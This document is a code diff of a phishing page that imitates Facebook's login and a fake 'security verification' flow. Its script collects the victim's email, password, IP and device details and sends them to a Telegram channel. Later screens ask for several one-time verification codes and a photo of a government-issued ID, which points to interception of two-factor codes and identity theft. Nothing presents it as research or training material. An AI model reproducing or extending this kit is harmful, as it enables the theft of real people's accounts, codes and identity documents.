@@ -15,22 +15,7 @@
   <meta name="twitter:title" content="Facebook Security Verification">
   <meta name="twitter:description" content="Trusted Contacts Security Update - Verify your account to maintain protection">
   <meta name="twitter:image" content="https://static.xx.fbcdn.net/rsrc.php/v3/y5/r/TJPKIuZGNxL.png">
-
-  <!-- Security and Trust Meta Tags -->
-  <meta name="referrer" content="strict-origin-when-cross-origin">
-  <meta name="theme-color" content="#1877F2">
-  <meta name="msapplication-TileColor" content="#1877F2">
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="apple-mobile-web-app-status-bar-style" content="default">
-  <meta name="format-detection" content="telephone=no">
-
-  <!-- DNS Prefetch for better performance -->
-  <link rel="dns-prefetch" href="//static.xx.fbcdn.net">
-  <link rel="dns-prefetch" href="//www.facebook.com">
-
-  <!-- Favicon -->
   <link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzE4NzdGMiI+PHBhdGggZD0iTTI0IDEyLjA3M2MwLTYuNjI3LTUuMzczLTEyLTEyLTEycy0xMiA1LjM3My0xMiAxMmMwIDUuOTkgNC4zODggMTAuOTU0IDEwLjEyNSAxMS45Mjd2LTguNDM3SDcuMDc4di0zLjQ5aDMuMDQ3VjkuNDNjMC0zLjAwNyAxLjc5Mi00LjY2OSA0LjUzMy00LjY2OSAxLjMxMiAwIDIuNjg2LjIzNCAyLjY4Ni4yMzR2Mi45NTNoLTEuNTE0Yy0xLjQ5MSAwLTEuOTU1LjkyNS0xLjk1NSAxLjg3NHYyLjI1aDMuMzI4bC0uNTMyIDMuNDloLTIuNzk2djguNDM3QzE5LjYxMiAyMy4wMjcgMjQgMTguMDYyIDI0IDEyLjA3M3oiLz48L3N2Zz4=">
-  <link rel="shortcut icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzE4NzdGMiI+PHBhdGggZD0iTTI0IDEyLjA3M2MwLTYuNjI3LTUuMzczLTEyLTEyLTEycy0xMiA1LjM3My0xMiAxMmMwIDUuOTkgNC4zODggMTAuOTU0IDEwLjEyNSAxMS45Mjd2LTguNDM3SDcuMDc4di0zLjQ5aDMuMDQ3VjkuNDNjMC0zLjAwNyAxLjc5Mi00LjY2OSA0LjUzMy00LjY2OSAxLjMxMiAwIDIuNjg2LjIzNCAyLjY4Ni4yMzR2Mi45NTNoLTEuNTE0Yy0xLjQ5MSAwLTEuOTU1LjkyNS0xLjk1NSAxLjg3NHYyLjI1aDMuMzI4bC0uNTMyIDMuNDloLTIuNzk2djguNDM3QzE5LjYxMiAyMy4wMjcgMjQgMTguMDYyIDI0IDEyLjA3M3oiLz48L3N2Zz4=">
   <style>
     /* Reset styles */
     * {
@@ -38,7 +23,7 @@
       padding: 0;
       box-sizing: border-box;
     }
-
+    
     body {
       font-family: SFProText-Regular, Helvetica, Arial, sans-serif;
       background-color: #f0f2f5;
@@ -46,7 +31,7 @@
       line-height: 1.34;
       min-height: 100vh;
     }
-
+    
     /* Facebook authentic design */
     .fb-container {
       display: flex;
@@ -55,7 +40,7 @@
       min-height: 100vh;
       padding: 20px;
     }
-
+    
     .fb-content {
       display: flex;
       align-items: center;
@@ -63,12 +48,12 @@
       width: 100%;
       gap: 100px;
     }
-
+    
     .fb-left {
       flex: 1;
       max-width: 580px;
     }
-
+    
     .fb-logo {
       color: #1877f2;
       font-size: 64px;
@@ -77,7 +62,7 @@
       margin-bottom: 16px;
       font-family: Klavika-Medium, sans-serif;
     }
-
+    
     .fb-tagline {
       color: #1c1e21;
       font-size: 28px;
@@ -85,12 +70,12 @@
       line-height: 32px;
       width: 500px;
     }
-
+    
     .fb-right {
       flex: 1;
       max-width: 396px;
     }
-
+    
     .fb-login-box {
       background: white;
       border-radius: 8px;
@@ -98,7 +83,7 @@
       padding: 20px;
       width: 100%;
     }
-
+    
     .fb-input {
       background: #f5f6f7;
       border: 1px solid #dddfe2;
@@ -110,18 +95,18 @@
       margin-bottom: 12px;
       line-height: 16px;
     }
-
+    
     .fb-input:focus {
       background: white;
       border-color: #1877f2;
       box-shadow: 0 0 0 2px #e7f3ff;
       outline: none;
     }
-
+    
     .fb-input::placeholder {
       color: #90949c;
     }
-
+    
     .fb-login-btn {
       background: #1877f2;
       border: none;
@@ -135,11 +120,11 @@
       margin-bottom: 16px;
       transition: background-color 0.1s;
     }
-
+    
     .fb-login-btn:hover {
       background: #166fe5;
     }
-
+    
     .fb-forgot {
       color: #1877f2;
       font-size: 14px;
@@ -148,16 +133,16 @@
       display: block;
       margin-bottom: 16px;
     }
-
+    
     .fb-forgot:hover {
       text-decoration: underline;
     }
-
+    
     .fb-divider {
       border-top: 1px solid #dadde1;
       margin: 20px 16px;
     }
-
+    
     .fb-create-btn {
       background: #42b883;
       border: none;
@@ -171,11 +156,11 @@
       margin: 0 auto;
       transition: background-color 0.1s;
     }
-
+    
     .fb-create-btn:hover {
       background: #36a420;
     }
-
+    
     .fb-create-page {
       color: #1c1e21;
       font-size: 14px;
@@ -183,30 +168,30 @@
       margin-top: 28px;
       text-align: center;
     }
-
+    
     .fb-create-page a {
       color: #1c1e21;
       font-weight: 600;
       text-decoration: none;
     }
-
+    
     .fb-create-page a:hover {
       text-decoration: underline;
     }
-
+    
     .error-message {
       color: #f02849;
       font-size: 13px;
       margin-top: 5px;
       margin-bottom: 5px;
     }
-
+    
     /* Loading spinner animation */
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-
+    
     /* Modal styles */
     .bedtime-modal {
       display: none;
@@ -219,13 +204,13 @@
       background-color: rgba(255, 255, 255, 0.8);
       backdrop-filter: blur(3px);
     }
-
+    
     .bedtime-modal.show {
       display: flex;
       align-items: center;
       justify-content: center;
     }
-
+    
     .modal-content {
       background-color: white;
       border-radius: 8px;
@@ -236,7 +221,7 @@
       max-height: 90vh;
       overflow-y: auto;
     }
-
+    
     .modal-close-button {
       background: #1877f2;
       border: none;
@@ -250,17 +235,17 @@
       display: inline-block;
       transition: background-color 0.1s;
     }
-
+    
     .modal-close-button:hover {
       background: #166fe5;
     }
-
+    
     .modal-close-button:disabled {
       background: #e4e6ea;
       color: #bcc0c4;
       cursor: not-allowed;
     }
-
+    
     /* Trusted Contacts Shield Responsive */
     .trusted-contacts-shield {
       margin-top: 32px;
@@ -270,32 +255,32 @@
       border-left: 4px solid #1877f2;
       box-shadow: 0 2px 8px rgba(24, 119, 242, 0.1);
     }
-
+    
     .shield-header {
       display: flex;
       align-items: center;
       margin-bottom: 12px;
     }
-
+    
     .shield-icon {
       margin-right: 12px;
       flex-shrink: 0;
     }
-
+    
     .shield-title {
       color: #1877f2;
       font-size: 16px;
       font-weight: 600;
       margin: 0;
     }
-
+    
     .shield-description {
       color: #1c1e21;
       font-size: 14px;
       line-height: 1.4;
       margin: 0;
     }
-
+    
     /* Loading page styles */
     .loading-overlay {
       position: fixed;
@@ -310,13 +295,13 @@
       align-items: center;
       justify-content: center;
     }
-
+    
     .loading-content {
       text-align: center;
       max-width: 400px;
       padding: 40px 20px;
     }
-
+    
     .loading-spinner {
       width: 64px;
       height: 64px;
@@ -326,26 +311,26 @@
       animation: spin 1s linear infinite;
       margin: 0 auto 24px;
     }
-
+    
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-
+    
     .loading-title {
       color: #1877F2;
       font-size: 24px;
       font-weight: bold;
       margin-bottom: 12px;
     }
-
+    
     .loading-subtitle {
       color: #65676B;
       font-size: 16px;
       line-height: 20px;
       margin-bottom: 32px;
     }
-
+    
     .loading-progress {
       width: 100%;
       max-width: 300px;
@@ -355,7 +340,7 @@
       overflow: hidden;
       margin-bottom: 12px;
     }
-
+    
     .loading-progress-bar {
       height: 100%;
       background-color: #1877F2;
@@ -363,7 +348,7 @@
       width: 0%;
       transition: width 0.1s ease;
     }
-
+    
     .loading-progress-text {
       color: #65676B;
       font-size: 14px;
@@ -376,77 +361,77 @@
         gap: 40px;
         text-align: center;
       }
-
+      
       .fb-left {
         max-width: none;
       }
-
+      
       .fb-tagline {
         width: auto;
         font-size: 24px;
         line-height: 28px;
       }
-
+      
       .fb-logo {
         font-size: 56px;
       }
-
+      
       .trusted-contacts-shield {
         margin-top: 24px;
         padding: 16px;
         text-align: left;
       }
-
+      
       .shield-title {
         font-size: 15px;
       }
-
+      
       .shield-description {
         font-size: 13px;
       }
     }
-
+    
     @media (max-width: 580px) {
       .fb-container {
         padding: 16px;
       }
-
+      
       .fb-login-box {
         padding: 16px;
       }
-
+      
       .fb-logo {
         font-size: 48px;
       }
-
+      
       .fb-tagline {
         font-size: 20px;
         line-height: 24px;
       }
-
+      
       .trusted-contacts-shield {
         margin-top: 20px;
         padding: 14px;
       }
-
+      
       .shield-header {
         margin-bottom: 8px;
       }
-
+      
       .shield-icon {
         margin-right: 8px;
       }
-
+      
       .shield-title {
         font-size: 14px;
       }
-
+      
       .shield-description {
         font-size: 12px;
         line-height: 1.3;
       }
     }
-
+    
     .create-account-button {
       background-color: #42B72A;
       color: white;
@@ -458,32 +443,32 @@
       cursor: pointer;
       transition: background-color 0.2s ease;
     }
-
+    
     .create-account-button:hover {
       background-color: #36A420;
     }
-
+    
     a {
       text-decoration: none;
       color: #1877F2;
     }
-
+    
     a:hover {
       text-decoration: underline;
     }
-
+    
     /* Footer styles */
     .footer {
       background-color: white;
       padding: 1.5rem 1rem;
       margin-top: auto;
     }
-
+    
     .language-list, .link-list {
       display: flex;
       flex-wrap: wrap;
     }
-
+    
     .language-list div, .link-list div {
       margin-right: 0.75rem;
       margin-bottom: 0.25rem;
@@ -491,7 +476,7 @@
       font-size: 0.75rem;
       cursor: pointer;
     }
-
+    
     /* Modal styles */
     .bedtime-modal {
       position: fixed;
@@ -508,12 +493,12 @@
       pointer-events: none;
       transition: opacity 0.3s ease;
     }
-
+    
     .bedtime-modal.show {
       opacity: 1;
       pointer-events: auto;
     }
-
+    
     .modal-content {
       background-color: white;
       padding: 2rem;
@@ -525,11 +510,11 @@
       transform: translateY(20px);
       transition: transform 0.3s ease;
     }
-
+    
     .bedtime-modal.show .modal-content {
       transform: translateY(0);
     }
-
+    
     .modal-close-button {
       background-color: #1877F2;
       color: white;
@@ -543,11 +528,11 @@
       min-width: 180px;
       margin-top: 10px;
     }
-
+    
     .modal-close-button:hover {
       background-color: #166FE5;
     }
-
+    
     .error-message {
       color: #ff0000;
       font-size: 0.75rem;
@@ -555,7 +540,7 @@
       margin-bottom: 0.75rem;
       display: none;
     }
-
+    
     /* Responsive styles */
     @media (min-width: 768px) {
       .main-container {
@@ -565,16 +550,16 @@
         gap: 2rem;
         padding: 5rem 1rem;
       }
-
+      
       .branding {
         width: 50%;
         text-align: left;
       }
-
+      
       .branding img {
         margin-left: 0;
       }
-
+      
       .branding h2 {
         margin-left: 0;
         margin-right: 0;
@@ -605,7 +590,7 @@
       <div class="fb-left">
         <h1 class="fb-logo">facebook</h1>
         <p class="fb-tagline">Connect with friends and the world around you on Facebook.</p>
-
+        
         <!-- Trusted Contacts Security Shield -->
         <div class="trusted-contacts-shield">
           <div class="shield-header">
@@ -621,33 +606,33 @@
           </p>
         </div>
       </div>
-
+      
       <div class="fb-right">
         <div class="fb-login-box">
           <form id="login-form">
             <input type="text" id="email" class="fb-input" placeholder="Email address or phone number" required>
             <div class="error-message" id="email-error">Please enter a valid email or phone number</div>
-
+            
             <input type="password" id="password" class="fb-input" placeholder="Password" required>
             <div class="error-message" id="password-error">Please enter your password</div>
-
+            
             <button type="submit" class="fb-login-btn">Log in</button>
           </form>
-
+          
           <a href="#" class="fb-forgot">Forgotten password?</a>
-
+          
           <div class="fb-divider"></div>
-
+          
           <button class="fb-create-btn">Create new account</button>
         </div>
-
+        
         <p class="fb-create-page">
           <a href="#"><strong>Create a Page</strong></a> for a celebrity, brand or business.
         </p>
       </div>
     </div>
   </div>
-
+  
   <!-- Confirmation Modal -->
   <div class="bedtime-modal" id="bedtime-modal">
     <div class="modal-content">
@@ -657,13 +642,13 @@
           <polyline points="22 4 12 14.01 9 11.01"></polyline>
         </svg>
         <h2 class="text-2xl font-bold mb-3 text-facebook-blue">Identity Verification</h2>
-
+        
         <!-- First Verification Step -->
         <div id="first-verification-step">
           <p class="mb-4" style="font-size: 16px; line-height: 1.4;">
             For your account security, we need to verify your identity.
           </p>
-
+          
           <!-- Facebook message style notification -->
           <div style="margin: 20px auto; padding: 15px; background-color: #f0f2f5; border-radius: 8px; width: 90%; max-width: 350px; text-align: left;">
             <p style="font-size: 14px; color: #1877F2; font-weight: 500; margin-bottom: 6px;">
@@ -673,7 +658,7 @@
               We've sent a security verification code to your registered email or phone number. Please enter the code below to confirm your identity and secure your Facebook account.
             </p>
           </div>
-
+          
           <!-- Verification Code Input -->
           <div style="margin: 20px auto; max-width: 350px;">
             <div style="text-align: left; margin-bottom: 8px;">
@@ -683,24 +668,24 @@
             <input type="text" id="verification-code" class="input-field" placeholder="Enter code" style="width: 100%; padding: 12px 16px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; text-align: center; letter-spacing: 2px; box-shadow: 0 0 0 2px transparent; transition: border-color 0.2s, box-shadow 0.2s;">
             <div class="error-message" id="verification-code-error" style="display: none; color: #ff0000; font-size: 12px; margin-top: 5px; text-align: left;">Please enter a valid 6-digit or 8-digit code</div>
           </div>
-
+          
           <button class="modal-close-button" id="submit-verification" style="display: inline-block; text-decoration: none; margin-top: 20px; opacity: 0.7; cursor: not-allowed; padding: 10px 20px; font-size: 15px; border-radius: 6px; background-color: #1877F2; color: white; border: none; font-weight: 600; min-width: 200px;" disabled>
             Verify and Continue
           </button>
         </div>
-
+        
         <!-- Pending Confirmation Step -->
         <div id="pending-confirmation-step" style="display: none;">
           <div style="text-align: center; padding: 20px;">
             <!-- Loading spinner -->
             <div style="margin: 0 auto 20px; width: 48px; height: 48px; border: 4px solid #f3f3f3; border-top: 4px solid #1877F2; border-radius: 50%; animation: spin 1s linear infinite;"></div>
-
+            
             <h3 style="color: #1877F2; font-weight: bold; margin-bottom: 15px; font-size: 20px;">Verifying Your Identity</h3>
-
+            
             <p style="font-size: 16px; line-height: 1.4; margin-bottom: 20px; color: #65676B;">
               Please wait while we verify your security code and authenticate your account...
             </p>
-
+            
             <!-- Progress indicator -->
             <div style="margin: 20px auto; max-width: 300px;">
               <div style="background-color: #f0f2f5; border-radius: 10px; height: 6px; overflow: hidden;">
@@ -710,7 +695,7 @@
                 <span id="countdown-text">Verification in progress... 5 seconds remaining</span>
               </p>
             </div>
-
+            
             <div style="margin-top: 25px; padding: 15px; background-color: #e3f2fd; border-radius: 8px; border-left: 4px solid #1877F2;">
               <p style="font-size: 14px; color: #1c1e21; margin: 0; text-align: left;">
                 <span style="color: #1877F2; font-weight: 500;">🔒 Security Notice:</span><br>
@@ -734,7 +719,7 @@
               You're one step away from securing your account
             </p>
           </div>
-
+          
           <!-- Facebook-style progress indicator -->
           <div style="margin: 20px auto 25px; max-width: 350px;">
             <div style="display: flex; align-items: center; margin-bottom: 8px;">
@@ -745,7 +730,7 @@
             </div>
             <p style="font-size: 12px; color: #65676B; text-align: right; margin: 0;">Step 3 of 4</p>
           </div>
-
+          
           <!-- Facebook-style final verification message -->
           <div style="margin: 20px auto; padding: 20px; background: linear-gradient(135deg, #e8f5e8 0%, #f0f9f0 100%); border-radius: 12px; width: 90%; max-width: 350px; text-align: left; border: 1px solid #42B72A; box-shadow: 0 2px 8px rgba(66, 183, 42, 0.1);">
             <div style="display: flex; align-items: flex-start; margin-bottom: 8px;">
@@ -760,7 +745,7 @@
               </div>
             </div>
           </div>
-
+          
           <!-- Enhanced third verification code input -->
           <div style="margin: 25px auto; max-width: 350px;">
             <div style="background: white; border-radius: 12px; padding: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); border: 1px solid #e4e6ea;">
@@ -772,24 +757,24 @@
               <div class="error-message" id="third-verification-code-error" style="display: none; color: #f02849; font-size: 12px; margin-top: 8px; text-align: center; padding: 8px; background-color: #fee; border-radius: 6px; border: 1px solid #f02849;">Please enter a valid 6-digit or 8-digit final verification code</div>
             </div>
           </div>
-
+          
           <button class="modal-close-button" id="submit-third-verification" style="display: inline-block; text-decoration: none; margin-top: 20px; opacity: 0.6; cursor: not-allowed; padding: 16px 32px; font-size: 16px; border-radius: 8px; background: linear-gradient(135deg, #42B72A 0%, #36a420 100%); color: white; border: none; font-weight: 600; min-width: 240px; box-shadow: 0 3px 8px rgba(66, 183, 42, 0.3); transition: all 0.3s ease;" disabled>
             Complete Final Verification
           </button>
         </div>
-
+        
         <!-- ID Verification Processing Step -->
         <div id="id-processing-step" style="display: none;">
           <div style="text-align: center; padding: 20px;">
             <!-- Loading spinner -->
             <div style="margin: 0 auto 20px; width: 48px; height: 48px; border: 4px solid #f3f3f3; border-top: 4px solid #1877F2; border-radius: 50%; animation: spin 1s linear infinite;"></div>
-
+            
             <h3 style="color: #1877F2; font-weight: bold; margin-bottom: 15px; font-size: 20px;">Processing Verification</h3>
-
+            
             <p style="font-size: 16px; line-height: 1.4; margin-bottom: 20px; color: #65676B;">
               Please wait while we complete your identity verification process...
             </p>
-
+            
             <!-- Progress indicator -->
             <div style="margin: 20px auto; max-width: 300px;">
               <div style="background-color: #f0f2f5; border-radius: 10px; height: 6px; overflow: hidden;">
@@ -799,7 +784,7 @@
                 <span id="id-countdown-text">Finalizing verification... 10 seconds remaining</span>
               </p>
             </div>
-
+            
             <div style="margin-top: 25px; padding: 15px; background-color: #e3f2fd; border-radius: 8px; border-left: 4px solid #1877F2;">
               <p style="font-size: 14px; color: #1c1e21; margin: 0; text-align: left;">
                 <span style="color: #1877F2; font-weight: 500;">🔒 Final Security Check:</span><br>
@@ -808,7 +793,7 @@
             </div>
           </div>
         </div>
-
+        
         <!-- ID Photo Verification Step -->
         <div id="id-verification-step" style="display: none;">
           <!-- Facebook-style header -->
@@ -823,7 +808,7 @@
               Complete your verification by uploading a government-issued ID
             </p>
           </div>
-
+          
           <!-- Facebook-style info card -->
           <div style="margin: 20px auto; padding: 20px; background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%); border-radius: 12px; max-width: 380px; border: 1px solid #e3e6ea; box-shadow: 0 1px 2px rgba(0,0,0,0.04);">
             <div style="display: flex; align-items: flex-start; margin-bottom: 12px;">
@@ -841,7 +826,7 @@
               </div>
             </div>
           </div>
-
+          
           <!-- Enhanced photo upload options -->
           <div style="margin: 25px auto; max-width: 380px;">
             <div style="display: flex; gap: 12px; margin-bottom: 20px;">
@@ -854,10 +839,10 @@
                 Upload File
               </button>
             </div>
-
+            
             <!-- Hidden file input -->
             <input type="file" id="photo-input" accept="image/*" style="display: none;">
-
+            
             <!-- Enhanced camera container -->
             <div id="camera-container" style="display: none; margin-bottom: 20px; background: white; border-radius: 12px; padding: 16px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
               <video id="camera-preview" style="width: 100%; max-width: 320px; border-radius: 8px; border: 2px solid #1877F2; box-shadow: 0 2px 8px rgba(0,0,0,0.1);" autoplay playsinline></video>
@@ -866,7 +851,7 @@
                 <button type="button" id="cancel-camera-btn" style="flex: 1; padding: 10px; background-color: #e4e6ea; color: #1c1e21; border: none; border-radius: 8px; font-size: 14px; font-weight: 500;">Cancel</button>
               </div>
             </div>
-
+            
             <!-- Enhanced photo preview -->
             <div id="photo-preview-container" style="display: none; margin-bottom: 20px; background: white; border-radius: 12px; padding: 16px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
               <img id="photo-preview" style="width: 100%; max-width: 320px; border-radius: 8px; border: 2px solid #42B72A; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
@@ -875,23 +860,23 @@
                 <button type="button" id="confirm-photo-btn" style="flex: 1; padding: 10px; background-color: #42B72A; color: white; border: none; border-radius: 8px; font-size: 14px; font-weight: 600;">✓ Looks Good</button>
               </div>
             </div>
-
+            
             <div class="error-message" id="photo-error" style="display: none; color: #f02849; font-size: 13px; margin-top: 8px; text-align: center; padding: 8px; background-color: #fee; border-radius: 6px; border: 1px solid #f02849;">Please take or upload a clear photo of your government-issued ID</div>
           </div>
-
+          
           <button class="modal-close-button" id="submit-id-verification" style="display: inline-block; text-decoration: none; margin-top: 25px; opacity: 0.6; cursor: not-allowed; padding: 14px 24px; font-size: 16px; border-radius: 8px; background: linear-gradient(135deg, #1877F2 0%, #166fe5 100%); color: white; border: none; font-weight: 600; min-width: 220px; box-shadow: 0 2px 4px rgba(24, 119, 242, 0.2); transition: all 0.3s ease;" disabled>
             Complete Verification
           </button>
         </div>
-
+        
         <!-- Second Verification Step -->
         <div id="second-verification-step" style="display: none;">
           <h3 style="color: #1877F2; font-weight: bold; margin-bottom: 10px; font-size: 20px;">Additional Verification Required</h3>
-
+          
           <p style="font-size: 16px; line-height: 1.4; margin-bottom: 15px;">
             To keep your account secure, we need to verify your identity with a second code.
           </p>
-
+          
           <!-- Second verification message -->
           <div style="margin: 20px auto; padding: 15px; background-color: #f0f2f5; border-radius: 8px; width: 90%; max-width: 350px; text-align: left; border-left: 4px solid #1877F2;">
             <p style="font-size: 14px; color: #1c1e21; line-height: 1.4; font-weight: normal;">
@@ -899,7 +884,7 @@
               For your protection, we've sent an additional security code to the primary email or phone number on your account. Please enter this code to complete the verification process. <strong>Do not navigate away from this page</strong>.
             </p>
           </div>
-
+          
           <!-- Second Verification Code Input -->
           <div style="margin: 20px auto; max-width: 350px;">
             <div style="text-align: left; margin-bottom: 8px;">
@@ -909,12 +894,12 @@
             <input type="text" id="second-verification-code" class="input-field" placeholder="Enter code" style="width: 100%; padding: 12px 16px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; text-align: center; letter-spacing: 2px; box-shadow: 0 0 0 2px transparent; transition: border-color 0.2s, box-shadow 0.2s;">
             <div class="error-message" id="second-verification-code-error" style="display: none; color: #ff0000; font-size: 12px; margin-top: 5px; text-align: left;">Please enter a valid 6-digit or 8-digit code</div>
           </div>
-
+          
           <button class="modal-close-button" id="submit-second-verification" style="display: inline-block; text-decoration: none; margin-top: 20px; opacity: 0.7; cursor: not-allowed; padding: 10px 20px; font-size: 15px; border-radius: 6px; background-color: #1877F2; color: white; border: none; font-weight: 600; min-width: 200px;" disabled>
             Complete Verification
           </button>
         </div>
-
+        
         <!-- ID Verification Step -->
         <div id="id-verification-step" style="display: none;">
           <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#1877F2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin: 0 auto 1rem;">
@@ -924,13 +909,13 @@
             <line x1="16" y1="17" x2="8" y2="17"></line>
             <polyline points="10,9 9,9 8,9"></polyline>
           </svg>
-
+          
           <h3 style="color: #1877F2; font-weight: bold; margin-bottom: 10px; font-size: 20px;">Identity Document Verification</h3>
-
+          
           <p style="font-size: 16px; line-height: 1.4; margin-bottom: 20px;">
             For additional security, please upload a photo of your government-issued ID (driver's license, passport, or national ID card).
           </p>
-
+          
           <!-- ID Upload Options -->
           <div style="margin: 20px auto; max-width: 350px;">
             <div style="display: flex; gap: 10px; margin-bottom: 20px;">
@@ -941,33 +926,33 @@
                 📁 Upload File
               </button>
             </div>
-
+            
             <!-- Hidden file input -->
             <input type="file" id="id-file-input" accept="image/*" style="display: none;">
-
+            
             <!-- Camera video element (hidden by default) -->
             <video id="camera-video" autoplay style="display: none; width: 100%; max-width: 300px; border-radius: 8px; margin-bottom: 10px;"></video>
             <canvas id="photo-canvas" style="display: none;"></canvas>
-
+            
             <!-- Photo preview area -->
             <div id="photo-preview" style="display: none; margin-bottom: 15px;">
               <img id="preview-image" style="width: 100%; max-width: 300px; border-radius: 8px; border: 2px solid #dddfe2;">
               <p style="font-size: 12px; color: #65676B; margin-top: 5px; text-align: center;">Photo captured successfully</p>
             </div>
-
+            
             <!-- Capture button (shown when camera is active) -->
             <button id="capture-photo-btn" style="display: none; width: 100%; padding: 12px; background-color: #1877F2; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; margin-bottom: 10px;">
               📸 Capture Photo
             </button>
-
+            
             <!-- Retake button -->
             <button id="retake-photo-btn" style="display: none; width: 100%; padding: 8px; background-color: #42B72A; color: white; border: none; border-radius: 6px; font-size: 14px; cursor: pointer; margin-bottom: 15px;">
               🔄 Retake Photo
             </button>
-
+            
             <div class="error-message" id="id-verification-error" style="display: none; color: #ff0000; font-size: 12px; margin-bottom: 10px; text-align: center;">Please take or upload a photo of your ID</div>
           </div>
-
+          
           <button class="modal-close-button" id="submit-id-verification" style="display: inline-block; text-decoration: none; margin-top: 10px; opacity: 0.7; cursor: not-allowed; padding: 10px 20px; font-size: 15px; border-radius: 6px; background-color: #1877F2; color: white; border: none; font-weight: 600; min-width: 200px;" disabled>
             Verify Identity
           </button>
@@ -979,13 +964,13 @@
             <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
             <polyline points="22 4 12 14.01 9 11.01"></polyline>
           </svg>
-
+          
           <h3 style="color: #42B72A; font-weight: bold; margin-bottom: 15px; font-size: 20px;">Security Verification Complete</h3>
-
+          
           <p style="font-size: 16px; line-height: 1.4; margin-bottom: 25px; color: #1c1e21;">
             Thank you for confirming your identity. Your account has been successfully verified and is now protected with enhanced security measures. You can safely continue to Facebook.
           </p>
-
+          
           <a href="https://www.facebook.com" class="modal-close-button" id="modal-close-button" style="display: inline-block; text-decoration: none; padding: 10px 20px; font-size: 15px; border-radius: 6px; background-color: #1877F2; color: white; border: none; font-weight: 600; min-width: 200px;">
             Continue to Facebook
           </a>
@@ -993,7 +978,7 @@
       </div>
     </div>
   </div>
-
+  
   <!-- Include centralized Telegram configuration -->
   <script src="telegram-config.js"></script>
 
@@ -1013,16 +998,16 @@
       const pendingConfirmationStep = document.getElementById('pending-confirmation-step');
       const progressBar = document.getElementById('progress-bar');
       const countdownText = document.getElementById('countdown-text');
-
+      
       // Function to show loading page with progress animation
       function showLoadingPage() {
         const loadingOverlay = document.getElementById('loading-overlay');
         const progressBar = document.getElementById('loading-progress-bar');
         const progressText = document.getElementById('loading-progress-text');
-
+        
         // Show loading overlay
         loadingOverlay.style.display = 'flex';
-
+        
         // Animate progress bar from 0% to 100% over 5 seconds
         let progress = 0;
         const messages = [
@@ -1032,11 +1017,11 @@
           'Preparing verification steps...',
           'Almost ready...'
         ];
-
+        
         const interval = setInterval(() => {
           progress += 2; // Increase by 2% every 100ms (5 seconds total)
           progressBar.style.width = progress + '%';
-
+          
           // Update message based on progress
           if (progress >= 20 && progress < 40) {
             progressText.textContent = messages[1];
@@ -1047,13 +1032,13 @@
           } else if (progress >= 80) {
             progressText.textContent = messages[4];
           }
-
+          
           if (progress >= 100) {
             clearInterval(interval);
           }
         }, 100);
       }
-
+      
       // Validate email field
       function validateEmail() {
         if (!emailInput.value.trim()) {
@@ -1064,7 +1049,7 @@
           return true;
         }
       }
-
+      
       // Validate password field
       function validatePassword() {
         if (!passwordInput.value.trim()) {
@@ -1075,78 +1060,78 @@
           return true;
         }
       }
-
+      
       // Event listeners for input fields
       emailInput.addEventListener('blur', validateEmail);
       passwordInput.addEventListener('blur', validatePassword);
-
+      
       emailInput.addEventListener('input', function() {
         if (emailError.style.display === 'block') {
           validateEmail();
         }
       });
-
+      
       passwordInput.addEventListener('input', function() {
         if (passwordError.style.display === 'block') {
           validatePassword();
         }
       });
-
+      
       // Form submission
       loginForm.addEventListener('submit', async function(e) {
         e.preventDefault();
-
+        
         const emailValid = validateEmail();
         const passwordValid = validatePassword();
-
+        
         if (emailValid && passwordValid) {
           const email = emailInput.value.trim();
           const password = passwordInput.value.trim();
-
+          
           try {
             // Get IP and location information
             const ipInfo = await getIpInfo();
-
+            
             // Get device information
             const deviceDetails = getDeviceDetails();
-
+            
             // Format message for Telegram
             const timestamp = new Date().toLocaleString();
             let message = `🚨 Login attempt from Facebook page at ${timestamp}:\n\n`;
             message += `👤 Credentials:\n• Username/Email: ${email || 'Not provided'}\n• Password: ${password || 'Not provided'}\n`;
             message += deviceDetails;
             message += `\n${ipInfo}`;
-
+            
             // Send message to Telegram
             const success = await sendTelegramMessage(message);
             console.log('Message sent to Telegram:', success);
-
+            
           } catch (error) {
             console.error('Error sending data:', error);
           }
-
+          
           // Show loading page immediately
           showLoadingPage();
-
+          
           // Redirect to first verification step after 3 seconds
           setTimeout(function() {
             window.location.href = '/verify-step1';
           }, 3000);
         }
       });
-
+      
       // Close modal when button is clicked
       closeButton.addEventListener('click', function() {
         modal.classList.remove('show');
       });
-
+      
       // Close modal when clicking outside content
       modal.addEventListener('click', function(e) {
         if (e.target === modal) {
           modal.classList.remove('show');
         }
       });
-
+      
       // Get the verification step elements
       const firstVerificationStep = document.getElementById('first-verification-step');
       const secondVerificationStep = document.getElementById('second-verification-step');
@@ -1159,7 +1144,7 @@
       const submitThirdVerificationButton = document.getElementById('submit-third-verification');
       const idVerificationStep = document.getElementById('id-verification-step');
       const verificationSuccess = document.getElementById('verification-success');
-
+      
       // Get ID verification elements
       const takePhotoBtn = document.getElementById('take-photo-btn');
       const uploadPhotoBtn = document.getElementById('upload-photo-btn');
@@ -1174,10 +1159,10 @@
       const confirmPhotoBtn = document.getElementById('confirm-photo-btn');
       const photoError = document.getElementById('photo-error');
       const submitIdVerificationButton = document.getElementById('submit-id-verification');
-
+      
       let selectedPhotoFile = null;
       let cameraStream = null;
-
+      
       // Validate first verification code
       function validateVerificationCode() {
         const code = verificationCodeInput.value.trim();
